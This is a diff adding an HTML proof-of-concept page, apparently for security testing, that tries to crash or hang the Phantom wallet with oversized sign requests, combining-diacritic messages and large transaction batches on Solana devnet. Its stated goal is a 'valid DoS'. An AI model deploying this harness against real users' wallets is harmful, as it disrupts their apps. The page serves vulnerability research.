@@ -1,0 +1,144 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>B3 Oversized Payload DoS</title>
+  <style>
+    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; max-width: 720px; margin: 0 auto; padding: 16px; background:#0d0d10; color:#e6e6e6; line-height:1.5; }
+    h1 { color:#a78bfa; font-size:20px; }
+    h2 { color:#f0abfc; font-size:15px; margin-top:18px; }
+    button { display:block; width:100%; padding:14px; background:#7c3aed; color:white; border:none; border-radius:8px; font-size:14px; margin: 6px 0; text-align:left; }
+    button.alt { background:#1f1f25; border:1px solid #2f2f37; color:#a5f3fc; }
+    .warn { background:#3f1d1d; border:1px solid #ef4444; padding:10px; border-radius:6px; color:#fecaca; font-size:13px; }
+    pre#log { background:#0a0a0c;border:1px solid #2f2f37;padding:10px;border-radius:6px;font-size:12px;color:#86efac;white-space:pre-wrap;word-break:break-all;max-height:240px;overflow:auto }
+    .desc { font-size:12px; color:#9ca3af; margin: 2px 0 8px 4px; }
+  </style>
+</head>
+<body>
+  <h1>B3 — Oversized signMessage / signTransaction</h1>
+  <div class="warn">
+    <b>REJECT setiap prompt</b>. Goal: app freeze, OOM crash, atau hang lebih dari 10 detik = DoS valid.<br>
+    Setelah test berat → force-quit Phantom + close Phantom in-app browser sebelum next test.
+  </div>
+
+  <button id="connect" class="alt">0) Connect (di Phantom in-app browser)</button>
+
+  <h2>signMessage payload sizes</h2>
+  <button data-fn="msg" data-size="100000">1) signMessage 100 KB</button>
+  <button data-fn="msg" data-size="1000000">2) signMessage 1 MB</button>
+  <button data-fn="msg" data-size="10000000">3) signMessage 10 MB</button>
+  <button data-fn="msg" data-size="50000000">4) signMessage 50 MB</button>
+  <div class="desc">Time how long Phantom takes to render prompt (or crash).</div>
+
+  <h2>signMessage with deep unicode</h2>
+  <button data-fn="msgcombining" data-size="50000">5) signMessage 50KB combining diacritics</button>
+  <button data-fn="msgcombining" data-size="500000">6) signMessage 500KB combining diacritics</button>
+
+  <h2>signTransaction stress</h2>
+  <button data-fn="txmemo" data-size="100000">7) tx with 100KB memo</button>
+  <button data-fn="txmemo" data-size="1000000">8) tx with 1MB memo (likely exceeds Solana 1232-byte tx limit — observe error path)</button>
+  <button data-fn="txmany" data-size="100">9) tx with 100 instructions</button>
+  <button data-fn="txmany" data-size="500">10) tx with 500 instructions</button>
+
+  <h2>signAllTransactions stress</h2>
+  <button data-fn="txbatch" data-size="50">11) signAllTransactions x50</button>
+  <button data-fn="txbatch" data-size="200">12) signAllTransactions x200</button>
+  <button data-fn="txbatch" data-size="1000">13) signAllTransactions x1000</button>
+
+  <h2>Status</h2>
+  <pre id="log"></pre>
+
+  <script src="https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
+  <script>
+  const web3 = solanaWeb3;
+  const conn = new web3.Connection("https://api.devnet.solana.com", "confirmed");
+  const MEMO = new web3.PublicKey("MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr");
+
+  function log(msg) {
+    const el = document.getElementById('log');
+    el.textContent = "[" + new Date().toISOString().slice(11,19) + "] " + msg + "\n" + el.textContent;
+  }
+
+  let provider, payer;
+  document.getElementById('connect').onclick = async () => {
+    provider = window.phantom?.solana;
+    if (!provider) { log("ERR: open via Phantom in-app browser"); return; }
+    try { const r = await provider.connect(); payer = r.publicKey; log("connected " + payer.toString()); }
+    catch (e) { log("connect err: " + (e?.message||e)); }
+  };
+
+  async function freshTx() {
+    const tx = new web3.Transaction();
+    tx.feePayer = payer;
+    tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
+    return tx;
+  }
+
+  const handlers = {
+    msg: async (size) => {
+      const msg = new TextEncoder().encode("X".repeat(size));
+      const t0 = performance.now();
+      log("→ signMessage " + size + " bytes");
+      try { await provider.signMessage(msg, "utf8"); log("!!! signed in " + (performance.now()-t0).toFixed(0) + "ms"); }
+      catch (e) { log("rejected/err after " + (performance.now()-t0).toFixed(0) + "ms: " + (e?.message||e)); }
+    },
+    msgcombining: async (size) => {
+      const base = "a";
+      const combo = "́".repeat(size / base.length);
+      const msg = new TextEncoder().encode(base + combo);
+      const t0 = performance.now();
+      log("→ signMessage combining " + msg.length + " bytes");
+      try { await provider.signMessage(msg, "utf8"); log("!!! signed in " + (performance.now()-t0).toFixed(0) + "ms"); }
+      catch (e) { log("rejected/err after " + (performance.now()-t0).toFixed(0) + "ms: " + (e?.message||e)); }
+    },
+    txmemo: async (size) => {
+      const tx = await freshTx();
+      tx.add(new web3.TransactionInstruction({
+        keys: [], programId: MEMO, data: Buffer.from("Y".repeat(size)),
+      }));
+      const t0 = performance.now();
+      log("→ signTransaction memo size=" + size);
+      try { await provider.signTransaction(tx); log("!!! signed in " + (performance.now()-t0).toFixed(0) + "ms"); }
+      catch (e) { log("rejected/err after " + (performance.now()-t0).toFixed(0) + "ms: " + (e?.message||e)); }
+    },
+    txmany: async (count) => {
+      const tx = await freshTx();
+      for (let i = 0; i < count; i++) {
+        tx.add(web3.SystemProgram.transfer({ fromPubkey: payer, toPubkey: payer, lamports: 0 }));
+      }
+      const t0 = performance.now();
+      log("→ signTransaction with " + count + " instructions");
+      try { await provider.signTransaction(tx); log("!!! signed in " + (performance.now()-t0).toFixed(0) + "ms"); }
+      catch (e) { log("rejected/err after " + (performance.now()-t0).toFixed(0) + "ms: " + (e?.message||e)); }
+    },
+    txbatch: async (count) => {
+      const txs = [];
+      const blockhash = (await conn.getLatestBlockhash()).blockhash;
+      for (let i = 0; i < count; i++) {
+        const tx = new web3.Transaction();
+        tx.feePayer = payer;
+        tx.recentBlockhash = blockhash;
+        tx.add(web3.SystemProgram.transfer({ fromPubkey: payer, toPubkey: payer, lamports: 0 }));
+        txs.push(tx);
+      }
+      const t0 = performance.now();
+      log("→ signAllTransactions count=" + count);
+      try { await provider.signAllTransactions(txs); log("!!! signed in " + (performance.now()-t0).toFixed(0) + "ms"); }
+      catch (e) { log("rejected/err after " + (performance.now()-t0).toFixed(0) + "ms: " + (e?.message||e)); }
+    },
+  };
+
+  document.querySelectorAll('button[data-fn]').forEach(btn => {
+    btn.onclick = () => {
+      if (!provider || !payer) { log("Connect dulu (button 0)"); return; }
+      const fn = handlers[btn.dataset.fn];
+      const size = parseInt(btn.dataset.size, 10);
+      fn(size);
+    };
+  });
+
+  log("provider=" + (window.phantom?.solana ? "ok" : "MISSING — open in Phantom in-app browser"));
+  </script>
+</body>
+</html>
